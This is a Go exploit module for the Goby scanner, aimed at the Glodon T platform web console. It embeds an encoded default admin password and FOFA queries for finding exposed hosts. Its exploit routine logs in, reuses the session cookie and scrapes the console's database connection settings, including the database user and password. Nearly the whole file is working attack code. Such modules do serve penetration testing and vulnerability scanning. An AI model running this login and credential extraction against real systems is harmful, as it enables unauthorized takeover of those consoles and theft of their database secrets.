package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Glodon T platform default credentials vulnerability",
    "Description": "<p>Glodon is a system management software of Glodon Technology Co., Ltd. </p><p>Glodon T platform is used to inherit and manage Glodon's products. Glodon T platform web console has a default credential through which an attacker can take over the target system.</p>",
    "Impact": "<p>Glodon T platform is used to inherit and manage Glodon's products. Glodon T platform web console has a default credential through which an attacker can take over the target system.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits should be greater than 8. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
    "Product": "GLODON console",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "GLODON T 平台 LogOn 接口控制台默认口令漏洞",
            "Product": "Glodon console",
            "Description": "<p>Glodon是广联达科技股份有限公司一款系统管理软件。</p><p>Glodon web控制台存在一个默认口令，恶意攻击者使用该凭据可接管目标Glodon web控制台，使⽤管理员权限操作核⼼的功能</p>",
            "Recommendation": "<p>1、修改默认⼝令，密码最好包含⼤⼩写字⺟、数字和特殊字符等，且位数⼤于8位。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p><p>3、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p>",
            "Impact": "<p>Glodon web控制台存在一个默认口令，恶意攻击者使用该凭据可接管目标Glodon web控制台，使⽤管理员权限操作核⼼的功能。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Glodon T platform default credentials vulnerability",
            "Product": "GLODON console",
            "Description": "<p>Glodon is a system management software of Glodon Technology Co., Ltd. </p><p>Glodon T platform is used to inherit and manage Glodon's products. Glodon T platform web console has a default credential through which an attacker can take over the target system.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits should be greater than 8. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls. </p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Glodon T platform is used to inherit and manage Glodon's products. Glodon T platform web console has a default credential through which an attacker can take over the target system.</span><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "body=\"src=\\\"/Scripts/DD_belatedPNG.js\" && body=\"url: \\\"/Console/Account/LogOn\\\"\"",
    "GobyQuery": "body=\"src=\\\"/Scripts/DD_belatedPNG.js\" && body=\"url: \\\"/Console/Account/LogOn\\\"\"",
    "Author": "i_am_ben@qq.com",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2022-03-08",
    "References": [
        "https://www.glodon.com/en/products"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "Default Credentials",
        "content": "Glodon T platform web console has a default credential through which an attacker can take over the target system."
    },
    "AttackSurfaces": {
        "Application": [
            "Glodon console"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10261"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/Console/Account/LogOn")
			cfg.Header.Store("Host", u.HostInfo)
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Connection", "close")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = `pws=30035003400360020007f002f007f002000620067006e006a006d`
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"url\":\"/Console/Home/Index\"") && strings.Contains(resp.Header["Set-Cookie"][0], "ConsoleLogOn=") {
					ss.VulURL = u.FixedHostInfo + " Credentials: admin"
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/Console/Account/LogOn")
			cfg.Header.Store("Host", expResult.HostInfo.HostInfo)
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Connection", "close")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = `pws=30035003400360020007f002f007f002000620067006e006a006d`
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"url\":\"/Console/Home/Index\"") && strings.Contains(resp.Header["Set-Cookie"][0], "ConsoleLogOn=") {
					cookies := ""
					for _, value := range resp.Header["Set-Cookie"] {
						cookies += value
					}
					cfg2 := httpclient.NewGetRequestConfig("/Console/Service/Manage/ModifyDataBase?dataBaseName=default")
					cfg2.Header.Store("Host", expResult.HostInfo.HostInfo)
					cfg2.Header.Store("X-Requested-With", "XMLHttpRequest")
					cfg2.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36")
					cfg2.Header.Store("Connection", "close")
					cfg2.Header.Store("Cookie", cookies)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					if dataResp, dataRespErr := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); dataRespErr == nil {
						if dataResp.StatusCode == 200 && strings.Contains(dataResp.Utf8Html, "<form action=\"\" id=\"ModifyDataBase\" method=\"post\">") {
							reg := regexp.MustCompile(`value=("|')(?s:(.*?))("|')`)
							result := reg.FindAllStringSubmatch(dataResp.Utf8Html, -1)
							expResult.Success = true
							expResult.Output = "`default` Database infomation：\r\n"
							expResult.Output += "DataSource: " + result[4][2] + "\r\n"
							expResult.Output += "InitialCatalog: " + result[5][2] + "\r\n"
							expResult.Output += "UserID: " + result[6][2] + "\r\n"
							expResult.Output += "Password: " + result[7][2] + "\r\n"
						} else {
							expResult.Success = false
							expResult.Output = "Target api request fail!"
						}
					} else {
						expResult.Success = false
						expResult.Output = "Target api request fail!"
					}
				}
			}
			return expResult
		},
	))
}
